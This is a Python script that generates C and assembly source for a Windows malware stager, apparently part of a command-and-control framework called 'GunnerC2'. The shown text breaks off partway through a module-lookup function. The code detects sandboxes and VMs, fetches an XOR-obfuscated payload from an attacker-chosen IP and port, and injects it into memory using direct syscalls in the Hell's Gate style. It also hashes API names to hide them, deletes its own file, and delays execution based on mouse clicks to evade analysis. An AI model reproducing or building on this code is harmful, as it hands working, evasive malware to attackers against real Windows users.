

def build_main(stager_ip, stager_port):
	MAIN_C = f"""

#include <Windows.h>



#include "Structs.h"
#include "Common.h"
#include "Debug.h"

#include <wininet.h>
#pragma comment(lib, "wininet.lib")  
#include <intrin.h>
#include <iphlpapi.h>
#pragma comment(lib, "iphlpapi.lib")



static void* my_realloc(void* ptr, SIZE_T newSize) {{
	HANDLE heap = GetProcessHeap();
	if (!ptr)
		return HeapAlloc(heap, 0, newSize);
	return HeapReAlloc(heap, 0, ptr, newSize);
}}

BOOL AsciiHexToBin(unsigned char** buffer, DWORD* bufSize)
{{
	unsigned char* txt = *buffer;
	DWORD          txtLen = *bufSize;
	DWORD          maxBin = txtLen / 4 + 1;
	unsigned char* bin = HeapAlloc(GetProcessHeap(), 0, maxBin);
	if (!bin) return FALSE;

	DWORD bi = 0;
	for (DWORD i = 0; i + 3 < txtLen; ++i) {{
		
		if ((txt[i] == '0' || txt[i] == 'O')
			&& (txt[i + 1] == 'x' || txt[i + 1] == 'X')
			&& hex_is_digit(txt[i + 2])
			&& hex_is_digit(txt[i + 3]))
		{{
			unsigned char hi = hex_value(txt[i + 2]);
			unsigned char lo = hex_value(txt[i + 3]);
			bin[bi++] = (hi << 4) | lo;
			i += 3; 
		}}
	}}

	HeapFree(GetProcessHeap(), 0, txt);
	*buffer = bin;
	*bufSize = bi;
	return TRUE;
}}

static BOOL checkbox(void)
{{
	HKEY hKey;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
		L"SYSTEM\\ControlSet001\\Services\\VBoxGuest",
		0, KEY_READ, &hKey) == ERROR_SUCCESS) {{
		RegCloseKey(hKey);
		return TRUE;
	}}
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
		L"SYSTEM\\ControlSet001\\Services\\VMTools",
		0, KEY_READ, &hKey) == ERROR_SUCCESS) {{
		RegCloseKey(hKey);
		return TRUE;
	}}
	if (GetModuleHandleW(L"sbiedll.dll") != NULL ||
		GetModuleHandleW(L"snxhk.dll") != NULL) {{
		return TRUE;
	}}
	return FALSE;
}}

static BOOL TheClockIsMyCock(void)
{{
	LARGE_INTEGER t0, t1, freq;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&t0);
	Sleep(100);
	QueryPerformanceCounter(&t1);

	double ms = (double)(t1.QuadPart - t0.QuadPart) * 1000.0 / (double)freq.QuadPart;
	return (ms < 80.0 || ms > 120.0);
}}

static BOOL TheFinalBonFonDon(void)
{{
	if (checkbox())   return TRUE;
	if (TheClockIsMyCock())         return TRUE;
	return FALSE;
}}

#define my_free(p)    HeapFree(GetProcessHeap(), 0, p)


float _fltused = 0;

//#define TARGET_PROCESS	L"Notepad.exe"


//#define ANTI_ANALYSIS

BOOL GetUpdate(LPCSTR url, unsigned char** buffer, DWORD* bufSize);

unsigned char* thecrackshack = NULL;
DWORD         thelengthofthebomb = 0;

int main() {{

	if (TheFinalBonFonDon()) {{
		ExitProcess(1);
	}}

	DWORD		dwProcessId = 0;
	HANDLE		hProcess = NULL;



	if (!Thebadmaninitialize()) {{
		return -1;
	}}


#ifdef ANTI_ANALYSIS

	if (!AntiAnalysis(20000)) {{
#ifdef DEBUG
		PRINTA("[!] Found A bad Environment ");
#endif // DEBUG
	}}

#endif 
	//--------------------------------------------------------------------------------------


	if (!GetUpdate("http://{stager_ip}:{stager_port}/payload.bin", &thecrackshack, &thelengthofthebomb)) {{
	#ifdef DEBUG
		PRINTA("[!] Failed to fetch update");
	#endif
		return -1;
		
	}}

	PRINTA("[*] Successfully fetched update (%u bytes)", thelengthofthebomb);

	PRINTA("[*] Raw fetched (enc) first 16 bytes:    ");
	for (int i = 0; i < 16; i++) {{
		PRINTA("0x%02X ", thecrackshack[i]);
		
	}}
	PRINTA("");

	if (!AsciiHexToBin(&thecrackshack, &thelengthofthebomb)) {{
#ifdef DEBUG
		PRINTA("[!] Failed to parse ASCII hex");
#endif
		return -1;
	}}

	PRINTA("[*] installing update, size = %u bytes", thelengthofthebomb);
	
	
	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, thecrackshack, thelengthofthebomb, TRUE)) {{
	#ifdef DEBUG
		//PRINTA("[!] Failed To install update ");
	#endif
	my_free(thecrackshack);
	return -1;
	
	}}
	my_free(thecrackshack);
	PRINTA("[*] update installation succeeded");

	return 0;
}}


BOOL GetUpdate(LPCSTR url, unsigned char** buffer, DWORD* bufSize)
{{
	HINTERNET hInet = InternetOpenA("GunnerC2", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	PRINTA("[*] InternetOpenA -> %p", hInet);

	if (!hInet) return FALSE;
	
		HINTERNET hUrl = InternetOpenUrlA(hInet, url, NULL, 0,
			INTERNET_FLAG_RELOAD |
			INTERNET_FLAG_KEEP_CONNECTION |
			INTERNET_FLAG_TRANSFER_BINARY,
			0);

		PRINTA("[*] InternetOpenUrlA(%s) -> %p", url, hUrl);
	if (!hUrl) {{
		InternetCloseHandle(hInet);
		return FALSE;
		
	}}
	
	DWORD bytesRead = 0, total = 0;
	unsigned char* buf = NULL;
	BYTE chunk[4096];
	
		while (InternetReadFile(hUrl, chunk, sizeof(chunk), &bytesRead) && bytesRead) {{
		unsigned char* tmp = (unsigned char*)my_realloc(buf, total + bytesRead);
		if (!tmp) {{ my_free(buf); InternetCloseHandle(hUrl); InternetCloseHandle(hInet); return FALSE; }}
		 buf = tmp;
		_memcpy(buf + total, chunk, bytesRead);
		total += bytesRead;
		PRINTA("[*] Downloaded chunk: %u bytes, total = %u", bytesRead, total);
		
	}}
	
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInet);
	PRINTA("[*] Completed download, total = %u bytes", total);
	
		*buffer = buf;
	*bufSize = total;
	return (buf != NULL);
}}
"""
	return MAIN_C

INJECT_C = f"""

#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"
#include <stddef.h>



VX_TABLE		g_Sys = {{ 0 }};
API_HASHING		g_Api = {{ 0 }};

const unsigned char thekeytothecity[] = {{ 0xbe, 0xba, 0xfe, 0xca, 0xef, 0xbe, 0xad, 0xde }};
const size_t thekeytothecity_len = sizeof(thekeytothecity);

typedef struct _TheBuild {{
	DWORD user_spacename;
	DWORD kernel_spacename;
	DWORD section_maker;
	DWORD section_mapviewer;
	DWORD section_unmapviewer;
	DWORD closer;
	DWORD thread_maker;
	DWORD waiter;
}} _TheBuild;

// 2) One function that computes them all at once
static inline _TheBuild BuildTheDragon(void)
{{
	_TheBuild h;

	const DWORD A = 0x11223344, B = A ^ 0x349D72E7;
	h.user_spacename = A ^ B;

	const DWORD C = 0x15221329, D = C ^ 0xFD2AD9BD;
	h.kernel_spacename = C ^ D;

	const DWORD E = 0x96228369;
	h.section_maker = E ^ (E ^ 0x192C02CE);
	h.section_mapviewer = E ^ (E ^ 0x91436663);
	h.section_unmapviewer = E ^ (E ^ 0x0A5B9402);
	h.closer = E ^ (E ^ 0x369BD981);
	h.thread_maker = E ^ (E ^ 0x8EC0B84A);
	h.waiter = E ^ (E ^ 0x6299AD3D);

	return h;
}}

BOOL Thebadmaninitialize() {{

	
	PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();
	PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
	if (!pCurrentPeb || !pCurrentTeb || pCurrentPeb->OSMajorVersion != 0xA)
		return FALSE;

	_TheBuild h = BuildTheDragon();

	
	PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->Ldr->InMemoryOrderModuleList.Flink->Flink - 0x10);

	
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
	if (!GetImageExportDirectory(pLdrDataEntry->DllBase, &pImageExportDirectory) || pImageExportDirectory == NULL)
		return FALSE;

	g_Sys.NtCreateSection.uHash = h.section_maker;
	g_Sys.NtMapViewOfSection.uHash = h.section_mapviewer;
	g_Sys.NtUnmapViewOfSection.uHash = h.section_unmapviewer;
	g_Sys.NtClose.uHash = h.closer;
	g_Sys.NtCreateThreadEx.uHash = h.thread_maker;
	g_Sys.NtWaitForSingleObject.uHash = h.waiter;
	g_Sys.NtQuerySystemInformation.uHash = NtQuerySystemInformation_JOAA;
	g_Sys.NtDelayExecution.uHash = NtDelayExecution_JOAA;

	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtMapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtUnmapViewOfSection))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtClose))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtCreateThreadEx))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtWaitForSingleObject))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtQuerySystemInformation))
		return FALSE;
	if (!GetVxTableEntry(pLdrDataEntry->DllBase, pImageExportDirectory, &g_Sys.NtDelayExecution))
		return FALSE;

	g_Api.pCallNextHookEx = (fnCallNextHookEx)GetProcAddressH(GetModuleHandleH(h.user_spacename), CallNextHookEx_JOAA);
	g_Api.pDefWindowProcW = (fnDefWindowProcW)GetProcAddressH(GetModuleHandleH(h.user_spacename), DefWindowProcW_JOAA);
	g_Api.pGetMessageW = (fnGetMessageW)GetProcAddressH(GetModuleHandleH(h.user_spacename), GetMessageW_JOAA);
	g_Api.pSetWindowsHookExW = (fnSetWindowsHookExW)GetProcAddressH(GetModuleHandleH(h.user_spacename), SetWindowsHookExW_JOAA);
	g_Api.pUnhookWindowsHookEx = (fnUnhookWindowsHookEx)GetProcAddressH(GetModuleHandleH(h.user_spacename), UnhookWindowsHookEx_JOAA);

	if (g_Api.pCallNextHookEx == NULL || g_Api.pDefWindowProcW == NULL || g_Api.pGetMessageW == NULL || g_Api.pSetWindowsHookExW == NULL || g_Api.pUnhookWindowsHookEx == NULL)
		return FALSE;

	
	g_Api.pGetModuleFileNameW = (fnGetModuleFileNameW)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), GetModuleFileNameW_JOAA);
	g_Api.pCloseHandle = (fnCloseHandle)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), CloseHandle_JOAA);
	g_Api.pCreateFileW = (fnCreateFileW)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), CreateFileW_JOAA);
	g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), GetTickCount64_JOAA);
	g_Api.pOpenProcess = (fnOpenProcess)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), OpenProcess_JOAA);
	g_Api.pSetFileInformationByHandle = (fnSetFileInformationByHandle)GetProcAddressH(GetModuleHandleH(h.kernel_spacename), SetFileInformationByHandle_JOAA);

	if (g_Api.pGetModuleFileNameW == NULL || g_Api.pCloseHandle == NULL || g_Api.pCreateFileW == NULL || g_Api.pGetTickCount64 == NULL || g_Api.pOpenProcess == NULL || g_Api.pSetFileInformationByHandle == NULL)
		return FALSE;

	return TRUE;
}}


BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess) {{

	ULONG							uReturnLen1 = 0,
		uReturnLen2 = 0;
	PSYSTEM_PROCESS_INFORMATION		SystemProcInfo = NULL;
	PVOID							pValueToFree = NULL;
	NTSTATUS						STATUS = 0;

	
	TheDogHouse(g_Sys.NtQuerySystemInformation.wSystemCall);
	TheFlagOfWudan(SystemProcessInformation, NULL, NULL, &uReturnLen1);

	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)uReturnLen1);
	if (SystemProcInfo == NULL) {{
		return FALSE;
	}}

	
	pValueToFree = SystemProcInfo;

	
	TheDogHouse(g_Sys.NtQuerySystemInformation.wSystemCall);
	STATUS = TheFlagOfWudan(SystemProcessInformation, SystemProcInfo, uReturnLen1, &uReturnLen2);

	while (TRUE) {{

		if (SystemProcInfo->ImageName.Length && HASHW(SystemProcInfo->ImageName.Buffer) == HASHW(szProcName)) {{
			
			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
			break;
		}}

		
		if (!SystemProcInfo->NextEntryOffset)
			break;

		
		SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
	}}

	HeapFree(GetProcessHeap(), 0, pValueToFree);

	
	if (*pdwPid == NULL || *phProcess == NULL)
		return FALSE;
	else
		return TRUE;
}}

void TakeAllTrilliare(unsigned char* data, size_t len)
{{
	for (size_t i = 0; i < len; i++) {{
		size_t pos = i % thekeytothecity_len;
		unsigned char real_key = thekeytothecity[thekeytothecity_len - 1 - pos];
		unsigned char plain = data[i] ^ real_key;

		if ((i ^ 0x37) & 1) {{
			data[i] = plain ^ 0x5A;
			data[i] ^= 0x5A; 
		}}
		else {{
			data[i] = plain;
			unsigned char tmp = data[i] ^ 0xA7;
			data[i] = tmp ^ 0xA7; 
		}}
	}}
}}


BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN SIZE_T sPayloadSize, IN BOOL bLocal) {{

	HANDLE				hSection = NULL;
	HANDLE				hThread = NULL;
	PVOID				pLocalAddress = NULL,
		pRemoteAddress = NULL,
		pExecAddress = NULL;
	NTSTATUS			STATUS = 0;
	SIZE_T				sViewSize = 0;
	LARGE_INTEGER		MaximumSize = {{
			.HighPart = 0,
			.LowPart = sPayloadSize
	}};


	DWORD				dwLocalFlag = PAGE_READWRITE;

	TheDogHouse(g_Sys.NtCreateSection.wSystemCall);
	TheFlagOfWudan(&hSection, SECTION_ALL_ACCESS, NULL, &MaximumSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

	if (bLocal) {{
		dwLocalFlag = PAGE_EXECUTE_READWRITE;
	}}

	TheDogHouse(g_Sys.NtMapViewOfSection.wSystemCall);
	TheFlagOfWudan(hSection, (HANDLE)-1, &pLocalAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, dwLocalFlag);

	_memcpy(pLocalAddress, pPayload, sPayloadSize);


	TakeAllTrilliare((unsigned char*)pLocalAddress, sPayloadSize);

	PRINTA("[i] First 16 bytes of fun game:");
	for (int i = 0; i < 16; i++) {{
		PRINTA("0x%02X ", ((BYTE*)pLocalAddress)[i]);
	}}
	PRINTA("");



	if (!bLocal) {{
		TheDogHouse(g_Sys.NtMapViewOfSection.wSystemCall);
		TheFlagOfWudan(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &sViewSize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);

	}}


	pExecAddress = pRemoteAddress;
	if (bLocal) {{
		pExecAddress = pLocalAddress;
	}}

	TheDogHouse(g_Sys.NtCreateThreadEx.wSystemCall);
	if ((STATUS = TheFlagOfWudan(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pExecAddress, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {{
#ifdef DEBUG
		//PRINTA("[!] NtCreateThreadEx Failed With Error : 0x%0.8X", STATUS);
#endif // DEBUG
		return FALSE;
	}}
		


	TheDogHouse(g_Sys.NtWaitForSingleObject.wSystemCall);
	TheFlagOfWudan(hThread, FALSE, NULL);


	TheDogHouse(g_Sys.NtUnmapViewOfSection.wSystemCall);
	TheFlagOfWudan((HANDLE)-1, pLocalAddress);


	TheDogHouse(g_Sys.NtClose.wSystemCall);
	TheFlagOfWudan(hSection);

	return TRUE;

}}
"""

WINAPI_C = f"""

#include <Windows.h>

#include "Structs.h"
#include "Common.h"


UINT32 TheHashTheBashA(_In_ PCHAR String)
{{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenA(String);

	while (Index != Length)
	{{
		Hash += String[Index++];
		Hash += Hash << INITIAL_SEED;
		Hash ^= Hash >> 6;
	}}

	Hash += Hash << 3;
	Hash ^= Hash >> 11;
	Hash += Hash << 15;

	return Hash;
}}


UINT32 TheHashTheBashW(_In_ PWCHAR String)
{{
	SIZE_T Index = 0;
	UINT32 Hash = 0;
	SIZE_T Length = lstrlenW(String);

	while (Index != Length)
	{{
		Hash += String[Index++];
		Hash += Hash << INITIAL_SEED;
		Hash ^= Hash >> 6;
	}}

	Hash += Hash << 3;
	Hash ^= Hash >> 11;
	Hash += Hash << 15;

	return Hash;
}}



CHAR _toUpper(CHAR C)
{{
	if (C >= 'a' && C <= 'z')
		return C - 'a' + 'A';

	return C;
}}

PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{{
	for (volatile int i = 0; i < Size; i++) {{
		((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
	}}
	return Destination;
}}



extern void* __cdecl memset(void*, int, size_t);
#pragma intrinsic(memset)
#pragma function(memset)

void* __cdecl memset(void* Destination, int Value, size_t Size) {{
	unsigned char* p = (unsigned char*)Destination;
	while (Size > 0) {{
		*p = (unsigned char)Value;
		p++;
		Size--;
	}}
	return Destination;
}}
"""

HELLSGATE_C = f"""

#include <Windows.h>

#include "Structs.h"
#include "Common.h"

static inline DWORD make_thedos_sig(void) {{
	const DWORD X = 0x11223344;
	const DWORD Y = X ^ 0x5A4D;
	return (DWORD)(X ^ Y);
}}

static inline DWORD make_thent_sig(void) {{
	const DWORD X = 0x99627383;
	const DWORD Y = X ^ 0x00004550;
	return (DWORD)(X ^ Y);
}}

PTEB RtlGetThreadEnvironmentBlock() {{
#if _WIN64
	return (PTEB)__readgsqword(0x30);
#else
	return (PTEB)__readfsdword(0x16);
#endif
}}


BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {{
	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
	if (pImageDosHeader->e_magic != make_thedos_sig()) {{
		return FALSE;
	}}

	
	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader->e_lfanew);
	if (pImageNtHeaders->Signature != make_thent_sig()) {{
		return FALSE;
	}}

	
	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
	return TRUE;
}}

BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {{
	PDWORD pdwAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfFunctions);
	PDWORD pdwAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNames);
	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory->AddressOfNameOrdinals);

	for (WORD cx = 0; cx < pImageExportDirectory->NumberOfNames; cx++) {{
		PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

		if (HASHA(pczFunctionName) == pVxTableEntry->uHash) {{
			pVxTableEntry->pAddress = pFunctionAddress;

			
			WORD cw = 0;
			while (TRUE) {{
				
				if (*((PBYTE)pFunctionAddress + cw) == 0x0f && *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
					return FALSE;

				
				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
					return FALSE;

			
				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
					&& *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
					&& *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
					&& *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
					&& *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
					&& *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {{
					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
					pVxTableEntry->wSystemCall = (high << 8) | low;
					break;
				}}

				cw++;
			}};
		}}
	}}

	if (pVxTableEntry->wSystemCall != NULL)
		return TRUE;
	else
		return FALSE;
}}
"""

HELLASM_ASM = f"""

; -- Data section ------------------------------------------------------------
section .data

TakeAllTrilliare:   dd 0

; -- Code section ------------------------------------------------------------
section .text
    global TheDogHouse
TheDogHouse:
    ; clear the flag first
    mov dword [rel TakeAllTrilliare], 0
    ; then store RCX into it (low 32 bits only)
    mov dword [rel TakeAllTrilliare], ecx
    ret

    global TheFlagOfWudan
TheFlagOfWudan:
    mov r10, rcx               
    mov eax, dword [rel TakeAllTrilliare]
    syscall
    ret
"""

ANTIANALYSIS_C = f"""

#include <Windows.h>

#include "Structs.h"
#include "Common.h"


extern VX_TABLE g_Sys;
extern API_HASHING g_Api;



HHOOK g_hMouseHook = NULL;

DWORD g_dwMouseClicks = 0;

//------------------------------------------------------------------------------------------------------------------------------------------------//
//------------------------------------------------------------------------------------------------------------------------------------------------//


LRESULT CALLBACK HookEvent(int nCode, WPARAM wParam, LPARAM lParam) {{

    // WM_RBUTTONDOWN :         "Right Mouse Click"
    // WM_LBUTTONDOWN :         "Left Mouse Click"
    // WM_MBUTTONDOWN :         "Middle Mouse Click"

    if (wParam == WM_LBUTTONDOWN || wParam == WM_RBUTTONDOWN || wParam == WM_MBUTTONDOWN) {{
		g_dwMouseClicks++;
    }}

    return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
}}


BOOL MouseClicksLogger() {{

    MSG         Msg = {{ 0 }};

    // installing hook 
    g_hMouseHook = g_Api.pSetWindowsHookExW(
        WH_MOUSE_LL,
        (HOOKPROC)HookEvent,
        NULL,
        0
    );
    if (!g_hMouseHook) {{
	}}

    // process unhandled events
    while (g_Api.pGetMessageW(&Msg, NULL, 0, 0)) {{
		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
    }}

    return TRUE;
}}

BOOL DeleteSelf() {{


	WCHAR					szPath[MAX_PATH * 2] = {{ 0 }};
	FILE_DISPOSITION_INFO	Delete = {{ 0 }};
	HANDLE					hFile = INVALID_HANDLE_VALUE;
	PFILE_RENAME_INFO		pRename = NULL;
	const wchar_t* NewStream = (const wchar_t*)NEW_STREAM;
	SIZE_T					sRename = sizeof(FILE_RENAME_INFO) + sizeof(NewStream);

	// allocating enough buffer for the 'FILE_RENAME_INFO' structure
	pRename = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sRename);
	if (!pRename) {{
		return FALSE;
	}}

	ZeroMemory(szPath, sizeof(szPath));
	ZeroMemory(&Delete, sizeof(FILE_DISPOSITION_INFO));


	Delete.DeleteFile = TRUE;

	
	pRename->FileNameLength = sizeof(NewStream);
	RtlCopyMemory(pRename->FileName, NewStream, sizeof(NewStream));

	
	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {{

		return FALSE;
	}}

	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {{

		return FALSE;
	}}

	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {{

		return FALSE;
	}}


	g_Api.pCloseHandle(hFile);

	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {{
		// in case the file is already deleted
		return TRUE;
	}}
	if (hFile == INVALID_HANDLE_VALUE) {{

		return FALSE;
	}}

	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {{

		return FALSE;
	}}


	g_Api.pCloseHandle(hFile);

	HeapFree(GetProcessHeap(), 0, pRename);

	return TRUE;
}}


BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {{

	DWORD				dwMilliSeconds		= ftMinutes * 60000;
	LARGE_INTEGER		DelayInterval		= {{ 0 }};
	LONGLONG			Delay				= 0;
	NTSTATUS			STATUS				= 0;
	DWORD				_T0					= 0,
						_T1					= 0;


	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	_T0 = g_Api.pGetTickCount64();
 
	TheDogHouse(g_Sys.NtDelayExecution.wSystemCall);
	if ((STATUS = TheFlagOfWudan(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {{

		return FALSE;
	}}

	_T1 = g_Api.pGetTickCount64();

	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
		return FALSE;



	return TRUE;
}}


BOOL AntiAnalysis(DWORD dwMilliSeconds) {{

	HANDLE					hThread			= NULL;
	NTSTATUS				STATUS			= 0;
	LARGE_INTEGER			DelayInterval	= {{ 0 }};
	FLOAT					i				= 1;
	LONGLONG				Delay			= 0;

	Delay = dwMilliSeconds * 10000;
	DelayInterval.QuadPart = -Delay;

	if (!DeleteSelf()) {{
		// Bumbaclut
	}}

	while (i <= 10) {{


		TheDogHouse(g_Sys.NtCreateThreadEx.wSystemCall);
		if ((STATUS = TheFlagOfWudan(&hThread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, MouseClicksLogger, NULL, NULL, NULL, NULL, NULL, NULL)) != 0) {{

			return FALSE;
		}}

		TheDogHouse(g_Sys.NtWaitForSingleObject.wSystemCall);
		if ((STATUS = TheFlagOfWudan(hThread, FALSE, &DelayInterval)) != 0 && STATUS != STATUS_TIMEOUT) {{

			return FALSE;
		}}

		TheDogHouse(g_Sys.NtClose.wSystemCall);
		if ((STATUS = TheFlagOfWudan(hThread)) != 0) {{

			return FALSE;
		}}

		if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {{

			return FALSE;
		}}

		if (!DelayExecutionVia_NtDE((FLOAT)(i / 2)))
			return FALSE;

		if (g_dwMouseClicks > 5)
			return TRUE;

		g_dwMouseClicks = 0;

		i++;
	}}

	return FALSE;
}}
"""
APIHASHING_C = f"""

#include <Windows.h>

#include "Structs.h"
#include "Common.h"
#include <intrin.h>

#ifndef BUILD_SEED
#define BUILD_SEED 0xC0FFEE42 
#endif

static inline WORD make_dos_sig(void) {{
	const WORD A = 0xA1B2;           
	const WORD B = (WORD)(A ^ 0x5A4D);
	return (WORD)(A ^ B);            
}}

static inline DWORD make_nt_sig(void) {{
	const DWORD X = 0x11223344;      
	const DWORD Y = X ^ 0x00004550;
	return (DWORD)(X ^ Y);           
}}


FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {{

	if (hModule == NULL || dwApiNameHash == NULL)
		return NULL;

	PBYTE pBase = (PBYTE)hModule;

	PIMAGE_DOS_HEADER			pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
	if (pImgDosHdr->e_magic != make_dos_sig())
		return NULL;

	PIMAGE_NT_HEADERS			pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
	if (pImgNtHdrs->Signature != make_nt_sig())
		return NULL;

	IMAGE_OPTIONAL_HEADER		ImgOptHdr = pImgNtHdrs->OptionalHeader;

	IMAGE_EXPORT_DIRECTORY* exp = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	PDWORD                   names = (PDWORD)(pBase + exp->AddressOfNames);
	PWORD                    ordinals = (PWORD)(pBase + exp->AddressOfNameOrdinals);
	PDWORD                   funcs = (PDWORD)(pBase + exp->AddressOfFunctions);
	DWORD                    count = exp->NumberOfNames;

	
	DWORD stride = ((BUILD_SEED >> 8) ^ (BUILD_SEED & 0xFF)) | 1;
	    
		for (DWORD pass = 0, idx = 0; pass < count; pass++, idx = (idx + stride) % count) {{
			if (((pass ^ BUILD_SEED) & 3) == 0) {{
			__nop(); __nop();
			
		}}
		
		CHAR * pFunctionName = (CHAR*)(pBase + names[idx]);
		DWORD mangledHash = HASHA(pFunctionName) ^ (BUILD_SEED >> 16);
		DWORD targetMangled = dwApiNameHash ^ (BUILD_SEED >> 16);
		if (mangledHash == targetMangled) {{
			__nop();  
			return (FARPROC)(pBase + funcs[ordinals[idx]]);
			
		}}
		
	}}

	return NULL;
}}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {{

	if (dwModuleNameHash == NULL)
		return NULL;

#ifdef _WIN64
	PPEB					pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
	PPEB					pPeb = (PEB*)(__readfsdword(0x30));
#endif

	PPEB_LDR_DATA			pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);
	PLDR_DATA_TABLE_ENTRY	pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

	while (pDte) {{

		if (pDte->FullDllName.Length != NULL && pDte->FullDllName.Length < MAX_PATH) {{

			CHAR UpperCaseDllName[MAX_PATH];

			DWORD i = 0;
			while (pDte->FullDllName.Buffer[i]) {{
				UpperCaseDllName[i] = (CHAR)_toUpper(pDte->FullDllName.Buffer[i]);
				i++;
			}}
